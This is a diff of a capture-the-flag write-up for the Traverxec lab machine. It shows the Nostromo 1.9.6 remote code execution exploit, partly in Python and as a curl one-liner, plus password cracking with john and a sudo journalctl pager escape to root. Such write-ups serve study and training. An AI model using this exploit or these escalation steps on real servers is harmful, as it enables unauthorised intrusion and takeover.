@@ -7,12 +7,13 @@ published: false
 ![](/assets/Traverxec/Traverxec.png)
 
 ### Summary
-- Traverxec is a linux machine hosting a web server called Nostromo and has SSH port open.
-- The response headers from the webserver reveal its version which happens to be vulnerable to a Remote Code Execution vulnerability.
-- After exploiting that, we get a shell as the `www-data` user. And, when going through the files in the webroot, we find Nostromo's configuration.
-- It reveals an accessible area within the `david` user's home directory. We find a passphrase-protected private SSH key there.
-- We manage to crack it using `john` and are able to login using SSH.
-- In `david`'s home path, we find a folder containing a Bash script that issues a `journalctl` command with `sudo` privileges. We exploit that to get a shell as root.
+- **Traverxec** is a **Linux** machine hosting a **web server** called **Nostromo** and has **SSH** port open.
+- The **response headers** from the webserver **reveal its version** which happens to be **vulnerable to a Remote Code Execution vulnerability.**
+- *After troubleshooting the exploit and making a few modifications,* we get **a shell** as the `www-data` user.
+- *One the box, when going through the files* ***in the webroot,*** we find **Nostromo's configuration file.**
+- It reveals **an accessible area** within the `david` user's **home directory**. We find a **passphrase-protected private SSH key** there.
+- We manage to **crack it** using `john` and are able to **login using SSH.**
+- *In* `david`*'s home path*, we find a **folder containing a Bash script** that issues a `journalctl` command with `sudo` **privileges**. We **exploit that to get a shell** as `root`.
 
 ---
 
@@ -30,21 +31,23 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-from `nmap`'s output, we notice that the web server is Nostromo version 1.9.6.
+*from* `nmap`*'s output,* we notice that the web server is **Nostromo version 1.9.6.**
 
-but before we check for exploits, we'll first take a look at the website.
+*but before we check for exploits,* we'll first take a look at the website.
 
 ### The website
 ![](/assets/Traverxec/website-home-page.jpg)
 
-static content for the most.
+**static content** for the most. Let's move on :D
 
 ### Searching and Fixing Exploits
-using `searchsploit` gets us two identical matches.
+using `searchsploit` gets us **two identical matches.**
 
 ![](/assets/Traverxec/searchsploit.jpg)
 
-looking at the exploit code:
+*to go manual,* we look at the exploit code:
+
+note: I took away the text art for a more concise view
 
 ```python
 #!/usr/bin/env python
@@ -75,8 +78,6 @@ def cve(target, port, cmd):
 
 if __name__ == "__main__":
 
-    print(art)
-
     try:
         target = sys.argv[1]
         port = sys.argv[2]
@@ -88,15 +89,17 @@ if __name__ == "__main__":
         print(help_menu)
 ```
 
-seems straightforward. Just a POST request. Let's give it a try:
+seems straightforward. Just a **POST request**. Let's give it a try:
 
 ![](/assets/Traverxec/exploit-error.jpg)
 
-an error occurs. Nothing to worry about. we check it out on Google to find this on Stack Overflow:
+we get a python error. who should worry when we've got **Google**? :)
+
+we search to find this answer on **Stack Overflow**:
 
 ![](/assets/Traverxec/stack-overflow-answer.jpg)
 
-following that, we modify the code
+*following that,* we **modify the code**
 
 ```python
 def cve(target, port, cmd):
@@ -112,17 +115,19 @@ then rerun the exploit:
 
 ![](/assets/Traverxec/no-feedback-exploit.jpg)
 
-no feedback whatsoever XD
+**no feedback** at all this time xD
 
-so we switch up the command to verify if we have code execution or not.
+*But,* ***no feedback doesn't necessarily mean no effect***
+
+*for blind situations like these*: it's good to use something like `wget` to **verify code execution.**
 
 ![](/assets/Traverxec/code-execution-verified.jpg)
 
-we're good :) let's get in with a reverse shell.
+**we're good :D** let's get in with a **reverse shell.**
 
 ![](/assets/Traverxec/got-shell.jpg)
 
-before going any further, I like to improve my shell. it's done in the below steps
+*before going any further, since we're on Linux,* it's nice to **improve our shell**. it's done in the below steps:
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")' || python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -136,43 +141,43 @@ stty rows 51 columns 228
 ```
 
 ### The Nostromo config file
-Right after logging in, I go into the `/var/nostromo` folder. I find this configuration file in the `conf` folder.
+*Right after logging in,* we go into `/var/nostromo`. there was a **configuration file** in the `conf` folder.
 
 ![](/assets/Traverxec/nostromo-conf.jpg)
 
 A couple of interesting things show up:
-- a username: david
+- a username: `david`
 - an `.htpasswd` file
 - and a section on `HOMEDIRS`
 
-`david` turned out to be a local user on the system
+`david` was a local user on the system
 
 ![](/assets/Traverxec/david-passwd.jpg)
 
-the `.htpasswd` file contained a hash. we cracked it with `john` and got a password:
+the `.htpasswd` file contains a hash. we **cracked it** with `john` and got a password:
 
 ![](/assets/Traverxec/htpasswd-cracked.jpg)
 
-But that password didn't work for either `root` or `david`.
+But that password *didn't work* for either `root` or `david`.
 
 ![](/assets/Traverxec/no-cred-reuse-for-htpassword.jpg)
 
-we keep it around just in case.
+we keep it around just in case..
 
 ### Understanding the HOMEDIRS feature
-previously, we attempted to list the contents of `david`'s profile but got access denied.
+*previously,* we attempted to list the contents of `david`'s profile but got denied access.
 
 ![](/assets/Traverxec/david-perm-denied.jpg)
 
-since the `HOMEDIRS` feature would give us access into `david`'s directory, we take a quick look at the online [documentation](https://www.nazgul.ch/dev/nostromo_man.html) to understand how to use it:
+*since the* `HOMEDIRS` *feature would give us access into* `david`*'s directory,* we take **a quick look** at the online [documentation](https://www.nazgul.ch/dev/nostromo_man.html) to understand how to use it:
 
-note: you can edit the CSS for the man page using the Chrome Dev Tools to make it clearer for reading
+note: *to make the page clearer for reading,* you may **edit the CSS** for the man page using the **Chrome Dev Tools.**
 
 ![](/assets/Traverxec/editing-site-css-for-clarity.jpg)
 
-We find that we can access a user's folder using the `~` followed by the username.
+We find that **we can access a user's folder over HTTP** using the `~` followed by the `username`.
 
-another thing is: users can define a certain directory to be shared through the `homedirs_public` option.
+another thing is: users **can define a certain directory to be shared** through the `homedirs_public` option.
 
 ![](/assets/Traverxec/homedirs_explained.jpg)
 
@@ -184,30 +189,30 @@ let's first check the home directory from the outside
 
 ![](/assets/Traverxec/home-dir-website.jpg)
 
-there's nothing in both the web page and the source code.
+there's nothing in both the web page or the source code.
 
-the result was the same with a `gobuster` brute force.
+a `gobuster` **brute force** didn't get us anything new either.
 
-Since the `public_www` folder has nowhere to be in except in `david`'s home directory, we tried to blindly change into it.
+*Since the* `public_www` *folder* **must be** *in* `david`*'s home directory,* we tried to change into it blindly.
 
 ![](/assets/Traverxec/public_www-violated.jpg)
 
-And it worked! And moreover, we found something that could give us access.
+And **it worked!** plus we found something that could give us access.
 
-we copy it to `/tmp` and extract it. We find a protected `id_rsa` that we need to crack:
+we **copy the archive** to `/tmp` where we **extract** it. Inside, we find a **protected** `id_rsa` that we need to crack:
 
 ![](/assets/Traverxec/id_rsa_found.jpg)
 
-we first change it to a hash using `ssh2john` and crack it using `john` to get a password: "hunter"
+we first **convert** it to a hash using `ssh2john` and **crack it** using `john` to get a password: "hunter"
 
 ![](/assets/Traverxec/id_rsa_cracked.jpg)
 
-and we access the machine as `david`
+we **change the permissions** on the SSH key (`chmod 600 <KEY_FILE>`) and use it to access the machine as `david`
 
 ![](/assets/Traverxec/ssh-as-david.jpg)
 
 ### Exploiting SUDO journalctl for Privesc
-Right after loggin in, we see a folder that sticks out: `bin`
+*Right after logging in,* we see **a folder that sticks out**: `bin`
 
 it had a script `server-status.sh` and a file called `server-stats.head`
 
@@ -217,31 +222,37 @@ looking at their contents:
 
 ![](/assets/Traverxec/bin-files-breakdown.jpg)
 
-they are all commands for checking the status of the Nostromo server
+the `server-stats.head` is just ASCII art
 
-the exploitable part here is the sudo part:
+within `server-status.sh` are all **commands for checking the status of the Nostromo server** (*as we would expect xD*)
+
+the **exploitable part** here is the `sudo` command:
 
 ```bash
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 ```
 
-because `journalctl` can be turned into a shell. A quick look on [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/#sudo) can confirm that.
+that's because `journalctl` ***can be escaped for a shell with the same privileges***.
+
+A quick look on [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/#sudo) can confirm that.
 
 ![](/assets/Traverxec/gtfo-bins-journalctl.jpg)
 
-that's because in "invokes the default pager" which can be `less`, `more`, `nano` or `vim`. which all can be broken out of to a shell.
+that's because it "invokes the default pager". It can be `less`, `more`, `nano` or `vim`. which are all escapable :]
 
-Let's first run the script to see if it asks for a password or not.
+Let's first **run the script** to see *if it asks for a password or not.*
 
 ![](/assets/Traverxec/script-test-run.jpg)
 
-alright, this means that the command `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` is available for `david` without a password being provided.
+It ran ***without prompting us for authentication.***
 
-But we won't get a pager when running in such a wide terminal:
+this means that the command `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` is available for `david` without him needing to provide a password.
+
+But we won't get a pager in such a wide terminal:
 
 ![](/assets/Traverxec/no-pager-invoked.jpg)
 
-But when we make it smaller ;)
+*But when we make it smaller with* `stty` ;)
 
 ```bash
 stty rows 20 columns 20
@@ -249,8 +260,17 @@ stty rows 20 columns 20
 
 ![](/assets/Traverxec/pager-invoked.jpg)
 
-we get a `less` pager which we can turn into a bash shell with `!/bin/bash`
+we get a `less` pager which we can be turned into a bash shell with `!/bin/bash`
 
 ![](/assets/Traverxec/rooted.jpg)
 
-Owned :D
+**Owned :D**
+
+### Rewriting the Nostromo exploit
+*After some brief testing, and* ***for the sake of simplicity,*** we **re-wrote the the exploit** for Nostromo as a `curl` one-liner:
+
+```bash
+curl -s -X $'POST' -H $'Content-Length: 1' --data-binary $'\x0d\x0aecho\x0d\x0aecho\x0d\x0a<COMMAND>' $'http://<HOSTNAME>:<PORT>/.%0d./.%0d./.%0d./.%0d./bin/sh' >/dev/null
+```
+
+![](/assets/Traverxec/exploit-rewritten.jpg)
